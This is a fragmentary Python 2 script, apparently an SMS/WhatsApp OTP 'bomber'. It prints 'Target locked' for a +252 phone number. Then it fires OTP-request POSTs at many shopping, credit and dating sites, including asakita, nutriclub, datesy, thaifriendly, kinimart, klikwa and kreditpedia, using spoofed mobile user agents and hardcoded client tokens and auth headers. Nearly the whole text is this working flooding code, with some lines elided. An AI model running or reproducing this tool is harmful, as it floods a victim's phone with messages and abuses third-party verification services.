...
#--------------------------------MAIN---------------------------------------------------
def main():
  print "%s[%s!%s] %sTarget locked >> %s%s"%(pu,me,pu,pu,ku,"+252"+nom)
  t = 1
...
def asakita():
  ...
  h = requests.post("https://www.asakita.id/api/auth/register/otp",headers={'User-Agent':'Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
','Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3'},data=data).text
  if 'MOBILE' in h:
...
def nutriclub():
  h = requests.post("https://www.nutriclub.co.id/otp/?phone=0"+nom+"&old_phone=0"+nom,headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
'})
...
def asani():
  j = requests.post("https://api.asani.co.id/api/v1/send-otp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
'},data=json.dumps({"phone":"62"+nom,"email":"Shdr290@gmail.com"}))
...
def datesy():
 to = requests.post("https://www.datesy.com/",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
'},data={'z':'phonelogingetpin','country':'252','number':nom,'ppclienttoken':'f61627ef220c356b6bf10e28a948c5e6'})
 if json.loads(to.text)["success"] == True:
  sukses("6","sms","datesy")
 else:
  gagal("6","sms","datesy")
def thaifriendly():
 tes = requests.post("https://www.thaifriendly.com/pl/index.php",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
'},data={'z':'phonelogingetpin','country':'252','number':nom,'ppclienttoken':'igq39qdc9rwk2ax1zrgdq'})
...
def kinimart():
 tem = requests.post("https://kinimart.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
'},data={'destination':'0'+nom,'otpLength':'6'})
 if json.loads(tem.text)["IsSuccess"] == True:
  sukses("9","wa","kinimart")
 else:
  gagal("9","wa","kinimart")
def klikwa():
 dat=json.dumps({"number":"+252"+nom})
 tes = requests.post("https://api.klikwa.net/v1/number/sendotp",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
','Authorization':'Basic QjMzOkZSMzM='},data=dat)
...
def kopidulukala():
 huh = requests.post("https://kopidulukala.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
'},data={'destination':'0'+nom,'otpLength':'6'})
 if json.loads(huh.text)["IsSuccess"] == True:
...
'User-Agent':'Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
',
...
def omamoriexpress():
 huh = requests.post("https://omamoriexpress.isellershop.com/services/identity/requestOTP",headers={'user-agent':'Mozilla/5.0 (Linux; Android 9; SM-J415F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.110 Mobile Safari/537.36
'},data={'destination':'0'+nom,'otpLength':'6'})
 if json.loads(huh.text)["IsSuccess"] == True:
...
'X-Requested-With':'com.ecreditpal.tropic2'
 ...
 hu=requests.post("https://www.kreditpedia.co.id:8089/tropic/sms_login/vcode",headers=hd,data={'phone':nom,'code':'252'})
 if json.loads(hu.text)["desc"] == 'Success':
  sukses("22","sms","kreditpedia")
 else:
  gagal("22","sms","kreditpedia")
def bocil():
 dat={'user_id':'','language':'in','phone':'252'+nom,'device_id':'04140E27D54E8CEF','retry':'0'}
